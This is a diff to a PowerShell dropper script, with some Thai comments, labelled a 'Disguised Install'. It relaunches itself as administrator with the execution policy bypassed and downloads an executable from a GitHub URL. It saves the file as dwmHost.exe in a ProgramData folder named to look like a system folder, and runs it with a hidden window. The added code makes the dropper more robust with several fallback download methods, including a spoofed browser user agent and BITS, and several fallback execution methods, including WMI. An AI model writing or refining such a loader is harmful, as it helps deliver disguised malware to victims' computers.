@@ -1,3 +1,4 @@
+# โค้ดที่ปรับปรุงแล้วสำหรับการดาวน์โหลดและรันให้แน่นอน
 # Menu Selection
 Write-Host "+ Program Installer & Runner (Disguised Install)"
 Write-Host "1. Install & Run"
@@ -7,7 +8,6 @@ $choice = Read-Host "Enter choice (1/2)"
 
 # Check for Administrator rights
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-# *ต้องใช้สิทธิ์ Admin เพื่อติดตั้งไฟล์ใน C:\ProgramData*
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "Restarting with administrator privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
@@ -16,49 +16,158 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 # Define paths and variables
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-# **ตำแหน่งติดตั้งที่ซ่อนตัว: C:\ProgramData\WindowsSystemState**
 $InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
-# **ชื่อไฟล์ปลายทาง: dwmHost.exe (ปลอมตัวเป็น Process ระบบ)**
 $SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
+$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe"
 
-# URL ดาวน์โหลด Raw file จาก GitHub (ของคุณ)
-$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
-
-# Install & Run Mode
+# Install & Run Mode - ENHANCED VERSION
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 if ($choice -eq "1") {
     Write-Host "`nStarting installation..."
 
-    # สร้างโฟลเดอร์ติดตั้งถ้ายังไม่มี
+    # Create installation folder
     Write-Host "Checking/Creating installation folder in ProgramData..."
     if (-not (Test-Path $InstallPath)) {
-        New-Item -Path $InstallPath -Type Directory | Out-Null
+        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
         Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
     }
 
-    # Download exe 
+    # Enhanced Download with multiple methods and retries
     Write-Host "Downloading and installing executable..."
-    try {
-        $tempfile = Join-Path $env:TEMP "temp_download.exe"
-        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
-        # ย้ายไฟล์ที่ดาวน์โหลดมาไปยัง ProgramData โดยใช้ชื่อ dwmHost.exe
-        Move-Item -Path $tempfile -Destination $SexeDestination -Force
-        Write-Host "Executable download completed." -ForegroundColor Green
-    } catch {
-        Write-Host "Executable download failed: $." -ForegroundColor Red
+    $downloadSuccess = $false
+    $maxRetries = 3
+    
+    for ($i = 1; $i -le $maxRetries; $i++) {
+        Write-Host "Download attempt $i of $maxRetries..."
+        
+        try {
+            # Method 1: Using WebClient (more reliable)
+            $webClient = New-Object System.Net.WebClient
+            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+            $webClient.DownloadFile($SexeUrl, $SexeDestination)
+            $downloadSuccess = $true
+            Write-Host "Download completed successfully!" -ForegroundColor Green
+            break
+        }
+        catch {
+            Write-Host "Download method 1 failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            
+            # Method 2: Using Invoke-WebRequest as fallback
+            try {
+                Write-Host "Trying alternative download method..."
+                Invoke-WebRequest -Uri $SexeUrl -OutFile $SexeDestination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                $downloadSuccess = $true
+                Write-Host "Alternative download completed!" -ForegroundColor Green
+                break
+            }
+            catch {
+                Write-Host "Download method 2 failed: $($_.Exception.Message)" -ForegroundColor Yellow
+                
+                if ($i -eq $maxRetries) {
+                    Write-Host "All download attempts failed. Trying one more approach..." -ForegroundColor Red
+                    
+                    # Method 3: Using BitsTransfer as last resort
+                    try {
+                        Import-Module BitsTransfer
+                        Start-BitsTransfer -Source $SexeUrl -Destination $SexeDestination
+                        $downloadSuccess = $true
+                        Write-Host "BitsTransfer download completed!" -ForegroundColor Green
+                    }
+                    catch {
+                        Write-Host "Final download attempt also failed." -ForegroundColor Red
+                    }
+                }
+            }
+        }
+        
+        if (-not $downloadSuccess -and $i -lt $maxRetries) {
+            Start-Sleep -Seconds 2
+        }
+    }
+
+    if (-not $downloadSuccess) {
+        Write-Host "CRITICAL: Download failed after all attempts. Exiting." -ForegroundColor Red
         exit
     }
 
-    # Run the program directly
-    Write-Host "Starting the program..."
-    try {
-        # รันโปรแกรมโดยตรง (ไม่ต้องใช้ -Verb RunAs เพื่อลดปัญหาการรัน)
-        Start-Process -FilePath $SexeDestination
-        Write-Host "Program started successfully." -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to start program: $." -ForegroundColor Red
+    # Verify file exists and has content
+    if (-not (Test-Path $SexeDestination)) {
+        Write-Host "ERROR: Downloaded file not found!" -ForegroundColor Red
+        exit
     }
-    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+
+    $fileSize = (Get-Item $SexeDestination).Length
+    if ($fileSize -eq 0) {
+        Write-Host "ERROR: Downloaded file is empty!" -ForegroundColor Red
+        exit
+    }
+
+    Write-Host "File verification passed. Size: $fileSize bytes" -ForegroundColor Green
+
+    # Enhanced execution with multiple methods
+    Write-Host "Starting the program with enhanced methods..."
+    $runSuccess = $false
+    
+    # Method 1: Direct execution
+    try {
+        Write-Host "Attempting direct execution..."
+        Start-Process -FilePath $SexeDestination -WindowStyle Hidden
+        $runSuccess = $true
+        Write-Host "Program started successfully (Method 1)." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Direct execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # Method 2: Using cmd.exe
+    if (-not $runSuccess) {
+        try {
+            Write-Host "Attempting execution via cmd..."
+            $cmdProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$SexeDestination`"" -WindowStyle Hidden -PassThru
+            Start-Sleep -Seconds 2
+            if (-not $cmdProcess.HasExited) {
+                $runSuccess = $true
+                Write-Host "Program started successfully (Method 2)." -ForegroundColor Green
+            }
+        }
+        catch {
+            Write-Host "CMD execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
+    }
+    
+    # Method 3: Using WMI
+    if (-not $runSuccess) {
+        try {
+            Write-Host "Attempting execution via WMI..."
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $SexeDestination
+            $runSuccess = $true
+            Write-Host "Program started successfully (Method 3)." -ForegroundColor Green
+        }
+        catch {
+            Write-Host "WMI execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
+    }
+    
+    # Method 4: Using .NET Process
+    if (-not $runSuccess) {
+        try {
+            Write-Host "Attempting execution via .NET Process..."
+            [System.Diagnostics.Process]::Start($SexeDestination)
+            $runSuccess = $true
+            Write-Host "Program started successfully (Method 4)." -ForegroundColor Green
+        }
+        catch {
+            Write-Host ".NET Process execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
+    }
+
+    if (-not $runSuccess) {
+        Write-Host "WARNING: All execution methods failed, but file is downloaded." -ForegroundColor Red
+        Write-Host "File location: $SexeDestination" -ForegroundColor Yellow
+        Write-Host "You can try to run it manually." -ForegroundColor Yellow
+    }
+
+    Write-Host "`nInstallation process completed." -ForegroundColor Green
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Clean Mode
@@ -66,13 +175,23 @@ if ($choice -eq "1") {
 } elseif ($choice -eq "2") {
     Write-Host "Cleanup installation..."
 
-    # Stop the process if running (ใช้ชื่อ dwmHost)
+    # Stop the process if running
     Write-Host "Stopping dwmHost process..."
     try {
-        Stop-Process -Name "dwmHost" -Force -ErrorAction SilentlyContinue
+        Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue | Stop-Process -Force
         Write-Host "Process stopped." -ForegroundColor Green
-    } catch {
+    }
+    catch {
         Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    # Additional process names that might be related
+    $relatedProcesses = @("dwmHost", "EEEEEEEEEEEEEEEEE", "WindowsSystemState")
+    foreach ($proc in $relatedProcesses) {
+        try {
+            Get-Process -Name "$proc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+        }
+        catch {}
     }
 
     # Remove files and folder
@@ -81,7 +200,6 @@ if ($choice -eq "1") {
         Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
     }
     
-    # ลบโฟลเดอร์ที่สร้างขึ้นด้วย
     if (Test-Path $InstallPath) {
         Remove-Item $InstallPath -Recurse -Force
         Write-Host "Removed installation folder: $InstallPath" -ForegroundColor Green
@@ -91,4 +209,12 @@ if ($choice -eq "1") {
 
 } else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+}
+
+# Additional cleanup to remove any temporary files
+$tempFiles = @("$env:TEMP\temp_download.exe", "$env:TEMP\EEEEEEEEEEEEEEEEE.exe")
+foreach ($tempFile in $tempFiles) {
+    if (Test-Path $tempFile) {
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    }
 }
